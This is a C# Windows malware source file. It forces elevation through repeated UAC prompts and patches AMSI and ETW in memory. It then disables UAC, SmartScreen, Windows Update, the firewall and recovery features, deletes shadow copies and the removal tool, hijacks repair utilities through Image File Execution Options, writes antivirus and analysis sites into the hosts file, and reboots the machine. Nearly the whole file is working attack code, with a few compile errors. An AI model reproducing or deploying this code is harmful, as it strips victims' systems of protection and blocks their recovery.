using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

class WinFuck
{
    static bool wdremove = false; //doesn't work correctly, I'm lazy
    static bool reset_survival = true;

    static void Main(string[] args) {
        if (!IsAdmin()) {
            RestartAsAdmin();
            return;
        }
        AMSIBypass();
        ETWBypass();
        DisableNotification();
        KillFilters();
        BlockUpdates();
        DisableDefender();
        BlockRecovery();
        BlockAVSites();
        BlockReset();
        Kill_WdFilters();
        Reboot();
    }

    static bool IsAdmin()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void RestartAsAdmin() {
        string exePatch = Environment.ProcessPath;
        ProcessStartInfo startInfo = new ProcessStartInfo {
            FileName = exePatch,
            UseShellExecute = true,
            Verb = "runas"
        };
        while (true) {
            try {
                Process.Start(startInfo);
                Environment.Exit(0);
            } catch {
                System.Threading.Thread.Sleep(100);
            }
        }
    }

    static void GrantFullControlToFile(string filePath) {

        try {
            IdentityReference administratorsGroup = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
            FileInfo fileInfo = new FileInfo(filePath);
            FileSecurity fileSecurity = fileInfo.GetAccessControl();
            fileSecurity.SetOwner(administratorsGroup);
            fileInfo.SetAccessControl(fileSecurity);
            fileSecurity = fileInfo.GetAccessControl();

            FileSystemAccessRule fullControlRule = new FileSystemAccessRule(
                administratorsGroup,
                FileSystemRights.FullControl,
                AccessControlType.Allow
            );

            fileSecurity.AddAccessRule(fullControlRule);
            fileInfo.SetAccessControl(fileSecurity);
        } catch { }
    }
    static void RunShort(string fileName, string arguments) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo {
                FileName = fileName,
                Arguments = arguments,
                CreateNoWindow = true,
                UseShellExecute = false
            };

            using (Process? proc = Process.Start(psi)) {
                proc?.WaitForExit(5000);
            }
        } catch { }
    }

    static void AMSIBypass() {
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string dllName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
    
        try {
            IntPtr amsi = LoadLibrary("amsi.dll");
            if (amsi == IntPtr.Zero) {
                return;
            }

            IntPtr scanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            if (scanBuffer == IntPtr.Zero) {
                return;
            }
            uint oldProtect = 0;
            VirtualProtect(scanBuffer, 6, 0x40, out oldProtect);
            byte[] patch = { 0x31, 0xC0, 0xC3 };
            Marshal.Copy(patch, 0, scanBuffer, patch.Length);
            VirtualProtect(scanBuffer, 6, oldProtect, out oldProtect);

        }
        catch { }
        }
    }

    public static void ETWBypass() {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        try {
            IntPtr ntdll = LoadLibrary("ntdll.dll");
            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

            uint oldProtect;
            VirtualProtect(etwEventWrite, 1, 0x40 , out oldProtect);

            Marshal.WriteByte(etwEventWrite, 0xC3);

            VirtualProtect(etwEventWrite, 1, oldProtect, out oldProtect);
        }
        catch { }
    }

    static void DisableNotification() {
        try {
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender Security Center", true)) {
                using (var key1 = key.CreateSubKey("Notifications", true)) {
                    key1.SetValue("DisableNotifications", 1, RegistryValueKind.DWord);
                    key1.SetValue("DisableEnhancedNotifications", 1, RegistryValueKind.DWord);
                }
                using (var key1 = key.CreateSubKey("Systray", true)) {
                    key1.SetValue("HideSystray", 1, RegistryValueKind.DWord);
                }
            }
        } catch { }

        try {
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection", true)) {
                key.SetValue("SummaryNotificationDisabled", 1, RegistryValueKind.DWord);
            }
        } catch { }

        try {
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard", true)) {
                using (var key1 = key.CreateSubKey("ASR", true)) {
                    key1.SetValue("HideMitigationUserNotifications", 1, RegistryValueKind.DWord);
                }
                    using (var key1 = key.CreateSubKey("Network Protection", true)) {
                    key1.SetValue("HideNetworkProtectionUserNotifications", 1, RegistryValueKind.DWord);
                }
            }
        } catch { }

        try {
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications", true)) {
                key.SetValue("DisableNotifications", 1, RegistryValueKind.DWord);
                key.SetValue("DisableEnhancedNotifications", 1, RegistryValueKind.DWord);
                key.SetValue("NoActionNotificationDisabled", 1, RegistryValueKind.DWord);
                key.SetValue("FilesBlockNotificationDisabled", 1, RegistryValueKind.DWord);
            }
        } catch { }

        using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run", true)) {
            string hexString = "030000000000000000000000";
            byte[] bytes = Convert.FromHexString(hexString);
            key.SetValue("SecurityHealth", bytes, RegistryValueKind.Binary);
        }
        using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
            key.DeleteValue("SecurityHealth", false);
        }

        string[] firewallProfiles = { "PrivateProfile", "PublicProfile", "DomainProfile", "StandardProfile" };
        foreach (var profile in firewallProfiles) {
            using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Policies\Microsoft\WindowsFirewall\{profile}", true)) {
                key.SetValue("DisableNotifications", 1, RegistryValueKind.DWord);
            }
        }
        string[] firewallProfiles1 = { "PrivateProfile", "PublicProfile", "DomainProfile", "StandardProfile" };
        foreach (var profile in firewallProfiles1) {
            using (var key = Registry.LocalMachine.CreateSubKey($@"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\{profile}", true)) {
                    key.SetValue("DisableNotifications", 1, RegistryValueKind.DWord);
            }
        }
        using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance", true)) {
            key.SetValue("Enabled", 0, RegistryValueKind.DWord);
        }
        using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\Explorer\", true)) {
            key.SetValue("DisableNotificationCenter", 1, RegistryValueKind.DWord);
        }
        using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\Explorer\", true)) {
            key.SetValue("DisableNotificationCenter", 1, RegistryValueKind.DWord);
        }
        using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
            key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
        }

        try {
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration", true)) {
                key.SetValue("Notification_Style", 1, RegistryValueKind.DWord); }
        } catch { }
        try {
            RunShort("powershell.exe", "-ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableNotifications $true\"");
        } catch { }
    }

    static void KillFilters() {
        try {
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
                key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                key.SetValue("ConsentPromptBehaviorUser", 0, RegistryValueKind.DWord);
                key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                key.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
                key.SetValue("EnableVirtualization", 0, RegistryValueKind.DWord);
                key.SetValue("EnableInstallerDetection", 0, RegistryValueKind.DWord);
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\", true)) {
                using (var key1 = key.CreateSubKey("System", true)) {
                    key1.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
                }
                using (var key1 = key.CreateSubKey("AppPrivacy", true)) {
                    key1.SetValue("DisableStoreSmartScreen", 1, RegistryValueKind.DWord);
                }
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true)) {
                key.SetValue("SmartScreenEnabled", "off", RegistryValueKind.String);
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Edge", true)) {
                key.SetValue("SmartScreenEnabled", 0, RegistryValueKind.DWord);
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen", true)) {
                key.SetValue("ConfigureAppInstallControlEnabled", 0, RegistryValueKind.DWord);
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen", true)) {
                key.SetValue("ConfigureAppInstallControl", "off", RegistryValueKind.String);
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments", true)) {
                key.SetValue("SaveZoneInformation", 1, RegistryValueKind.DWord);
            }
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\AppHost", true)) {
                key.SetValue("EnableWebContentEvaluation", 0, RegistryValueKind.DWord);
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\DeviceGuard", true)) {
                key.SetValue("EnableVirtualizationBasedSecurity", 0, RegistryValueKind.DWord);
                key.SetValue("LsaCfgFlags", 0, RegistryValueKind.DWord);
                key.SetValue("RequirePlatformSecurityFeatures", 0, RegistryValueKind.DWord);
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\", true)) {
                using (var key1 = key.CreateSubKey("Lsa", true)) {
                    key1.SetValue("RunAsPPL", 0, RegistryValueKind.DWord);
                }
                using (var key1 = key.CreateSubKey("DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity", true)) {
                    key1.SetValue("Enabled", 0, RegistryValueKind.DWord);
                }
            }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\", true)) {
                key.SetValue("PUAProtection", 0, RegistryValueKind.DWord);
            }
            RunShort("schtasks.exe", "/change /tn \"\\Microsoft\\Windows\\RemovalTools\\MRT_HB\" /disable");
            System.IO.File.Delete(@"C:\\Windows\\System32\\MRT.exe");
        } catch { }
    }

    static void BlockUpdates() {
        try {
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\", true)) {
                using (var key1 = key.CreateSubKey("AU", true)) {
                    key1.SetValue("DontOfferThroughWUAU", 1, RegistryValueKind.DWord);
                    key1.SetValue("NoAutoUpdate", 1, RegistryValueKind.DWord);
                    key1.SetValue("AUOptions", 1, RegistryValueKind.DWord);
                }
                using (var key1 = key.CreateSubKey("", true)) {
                    key1.SetValue("DoNotConnectToWindowsUpdateInternetLocations", 1, RegistryValueKind.DWord);
                    key1.SetValue("DisableWindowsUpdateAccess", 1, RegistryValueKind.DWord);
                }
            }
        } catch { }
        RunShort("sc.exe", "config wuauserv start=disabled");
        RunShort("net.exe", "stop wuauserv /y");
        RunShort("sc.exe", "config UsoSvc start=disabled");
        RunShort("net.exe", "stop UsoSvc /y");
        RunShort("net.exe", "stop WaaSMedicSvc /y");
        RunShort("sc.exe", "config dosvc start=disabled");
        RunShort("net.exe", "stop dosvc /y");
    }

    static void DisableDefender() {
        if (wdremove == true) {
            // Soon
            DisableDefenderFeatures();
        }
    }

    static void DisableDefenderFeatures() {
        if (wdremove == true) {
            try {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard", true)) {
                    using (var key1 = key.CreateSubKey("Controlled Folder Access", true)) {
                        key1.SetValue("EnableControlledFolderAccess", 0, RegistryValueKind.DWord);
                    }
                    using (var key1 = key.CreateSubKey("", true)) {
                        key1.SetValue("ExploitGuardEnabled", 0, RegistryValueKind.DWord);
                    }
                }
            } catch { }

            try {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine\", true))
                {
                    key.SetValue("EnableNetworkProtection", 0, RegistryValueKind.DWord);
                    key.SetValue("CloudBlockLevel", 0, RegistryValueKind.DWord);
                }
            } catch { }
        }
    }

    static void BlockRecovery() {
        try {
            RunShort("netsh.exe", "advfirewall set allprofiles state off");
            RunShort("reagentc", "/disable");
            RunShort("bcdedit", "/set {current} recoveryenabled No");
            RunShort("bcdedit", "/set {current} bootstatuspolicy IgnoreShutdownFailures");
            RunShort("schtasks.exe", "/change /tn \"\\Microsoft\\Windows\\Servicing\\ProactiveScan\" /disable");
            RunShort("chkntfs.exe", "/x c: d: e:");
            RunShort("vssadmin.exe", "delete shadows /all /quiet");
            RunShort("powershell.exe", "-ExecutionPolicy Bypass -Command \"Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object { Disable-ComputerRestore -Drive ($_.DeviceID + '\\') }\"");
            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\mpssvc", true)) { key.SetValue("Start", 4, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CrashControl", true)) { key.SetValue("AutoReboot", 0, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", true)) { key.SetValue("SettingsPageVisibility", "hide:recovery;windowsupdate;backup;delivery-optimization", RegistryValueKind.String); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\RecoveryEnvironment", true)) { key.SetValue("DisableOSReset", 1, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) { key.SetValue("DisableOSReset", 1, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore", true)) { key.SetValue("DisableSR", 1, RegistryValueKind.DWord); key.SetValue("DisableConfig", 1, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", true)) { key.SetValue("DisableSR", 1, RegistryValueKind.DWord); key.SetValue("DisableConfig", 1, RegistryValueKind.DWord); }
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System", true)) { key.SetValue("DisableCMD", 2, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Settings", true)) { key.SetValue("DisableDriverRollback", 1, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot\Option", true)) { key.SetValue("OptionValue", 0, RegistryValueKind.DWord); }
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", true)) {
            using (var k = key.CreateSubKey("bootim.exe", true)) { k.SetValue("Debugger", "", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("msconfig.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM msconfig.exe", RegistryValueKind.String); } }
            Registry.LocalMachine.DeleteSubKeyTree(@"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal", false);
            Registry.LocalMachine.DeleteSubKeyTree(@"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", false);
        } catch (Exception ex) { }
    }

    static void BlockAVSites() {
    string hostsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts");
    string hostsContent = """

     0.0.0.0 windowsdefender.microsoft.com
     0.0.0.0 defender.microsoft.com
     0.0.0.0 smartscreen.microsoft.com
     0.0.0.0 smartscreen-prod.microsoft.com
     0.0.0.0 update.microsoft.com
     0.0.0.0 msupdate.microsoft.com
     0.0.0.0 definitionupdates.microsoft.com
     0.0.0.0 wdcp.microsoft.com
     0.0.0.0 wdcpalt.microsoft.com
     0.0.0.0 detection.microsoft.com
     0.0.0.0 mpas.badsub.alerts.microsoft.com
     0.0.0.0 europe.smartscreen-prod.microsoft.com
     0.0.0.0 v10.events.data.microsoft.com
     0.0.0.0 v20.events.data.microsoft.com
     0.0.0.0 watson.telemetry.microsoft.com
     0.0.0.0 avast.com
     0.0.0.0 www.avast.com
     0.0.0.0 bits.avast.com
     0.0.0.0 va.avast.com
     0.0.0.0 avg.com
     0.0.0.0 www.avg.com
     0.0.0.0 bits.avg.com
     0.0.0.0 kaspersky.com
     0.0.0.0 www.kaspersky.com
     0.0.0.0 kaspersky.ru
     0.0.0.0 www.kaspersky.ru
     0.0.0.0 kaspersky-labs.com
     0.0.0.0 dnl-kaspersky.com
     0.0.0.0 eset.com
     0.0.0.0 www.eset.com
     0.0.0.0 update.eset.com
     0.0.0.0 um01.eset.com
     0.0.0.0 um02.eset.com
     0.0.0.0 bitdefender.com
     0.0.0.0 www.bitdefender.com
     0.0.0.0 upgrade.bitdefender.com
     0.0.0.0 nimbus.bitdefender.net
     0.0.0.0 norton.com
     0.0.0.0 www.norton.com
     0.0.0.0 update.symantec.com
     0.0.0.0 liveupdate.symantec.com
     0.0.0.0 liveupdate.symantecliveupdate.com
     0.0.0.0 mcafee.com
     0.0.0.0 www.mcafee.com
     0.0.0.0 update.mcafee.com
     0.0.0.0 download.mcafee.com
     0.0.0.0 trendmicro.com
     0.0.0.0 www.trendmicro.com
     0.0.0.0 activeupdate.trendmicro.com
     0.0.0.0 sophos.com
     0.0.0.0 www.sophos.com
     0.0.0.0 d1.sophosupd.com
     0.0.0.0 d2.sophosupd.com
     0.0.0.0 malwarebytes.com
     0.0.0.0 www.malwarebytes.com
     0.0.0.0 telemetry.malwarebytes.com
     0.0.0.0 spybot.net
     0.0.0.0 www.spybot.net
     0.0.0.0 drweb.com
     0.0.0.0 www.drweb.com
     0.0.0.0 update.drweb.com
     0.0.0.0 avira.com
     0.0.0.0 www.avira.com
     0.0.0.0 update.avira.org
     0.0.0.0 bulldogsecurity.com
     0.0.0.0 clamav.net
     0.0.0.0 database.clamav.net
     0.0.0.0 comodo.com
     0.0.0.0 download.comodo.com
     0.0.0.0 virustotal.com
     0.0.0.0 www.virustotal.com
     0.0.0.0 360totalsecurity.com
     0.0.0.0 360.cn
     0.0.0.0 qihu.com
     0.0.0.0 tencent.com
     0.0.0.0 rising.com.cn
     0.0.0.0 baidu.com
     0.0.0.0 Ahnlab.com
     0.0.0.0 carbonblack.com
     0.0.0.0 crowdstrike.com
     0.0.0.0 fireeye.com
     0.0.0.0 sentinelone.com
     0.0.0.0 checkpoint.com
     0.0.0.0 cylance.com
     0.0.0.0 paloaltonetworks.com
     0.0.0.0 hybrid - analysis.com
     0.0.0.0 any.run
     0.0.0.0 app.any.run
     0.0.0.0 joesecurity.org
     0.0.0.0 metascan - online.com
     0.0.0.0 opswat.com
     
     """;
        try {
            File.AppendAllText(hostsPath, hostsContent);
            RunShort("ipconfig.exe", "/flushdns");
        }
        catch (UnauthorizedAccessException) { }
    }

    static void BlockReset() {
        using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers", true)) {
            key.SetValue("DefaultLevel", 262144, RegistryValueKind.DWord);
            key.SetValue("TransparentEnabled", 1, RegistryValueKind.DWord);
            key.SetValue("PolicyScope", 0, RegistryValueKind.DWord);
            using (var k = key.CreateSubKey(@"0\Paths\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}", true)) {
                k.SetValue("ItemData", @"C:\Windows\System32\systemreset.exe", RegistryValueKind.String);
                k.SetValue("Description", "Block System Reset", RegistryValueKind.String);
                k.SetValue("SaferFlags", 0, RegistryValueKind.DWord);
            }
            using (var k = key.CreateSubKey(@"0\Paths\{B2C3D4E5-F6G7-8901-BCDE-F12345678901}", true)) {
                k.SetValue("ItemData", @"C:\Windows\System32\RecoveryDrive.exe", RegistryValueKind.String);
                k.SetValue("Description", "Block Recovery Tools", RegistryValueKind.String);
                k.SetValue("SaferFlags", 0, RegistryValueKind.DWord);
            }
        }
        using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", true)) {
            using (var k = key.CreateSubKey("sfc.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM sfc.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("reagentc.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM reagentc.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("rstrui.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM rstrui.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("sdclt.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM sdclt.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("recdisc.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM recdisc.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("systemreset.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM systemreset.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("RecoveryDrive.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM RecoveryDrive.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("mrt.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM mrt.exe", RegistryValueKind.String); }
            using (var k = key.CreateSubKey("MRT.exe", true)) { k.SetValue("MitigationOptions", Convert.FromHexString("00000000000000000000000000000000"), RegistryValueKind.Binary); }
            using (var k = key.CreateSubKey("TiWorker.exe", true)) { k.SetValue("Debugger", "taskkill /F /IM TiWorker.exe", RegistryValueKind.String); }
        }
    }
    static void Kill_WdFilters() {
        if (wdremove == true) {
            try {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services", true)) {
                    using (var subKey = key.CreateSubKey("WinDefend", true)) { subKey.SetValue("Start", 4, RegistryValueKind.DWord); }
                    using (var subKey = key.CreateSubKey("WdNisSvc", true)) { subKey.SetValue("Start", 4, RegistryValueKind.DWord); }
                    using (var subKey = key.CreateSubKey("WdFilter", true)) { subKey.SetValue("Start", 4, RegistryValueKind.DWord); }
                }
                try {
                    RunShort("net.exe", "stop WinDefend /y");
                    RunShort("net.exe", "stop WdNisSvc /y");
                    RunShort("sc.exe", "config WinDefend start=disabled");
                    RunShort("sc.exe", "config WdNisSvc start=disabled");
                } catch (Exception ex) { Debug.WriteLine($"Error in Stop_WdFilters: {ex.Message}"); }
            }
            catch (Exception ex) {
                Debug.WriteLine($"Error in Kill_WdFilters: {ex.Message}");
            }
        }
    }

    static void Reboot() {
        if (reboot == true) {
            System.Threading.Thread.Sleep(10000);
            RunShort("shutdown.exe", "/r /t 0");
        }
    }
}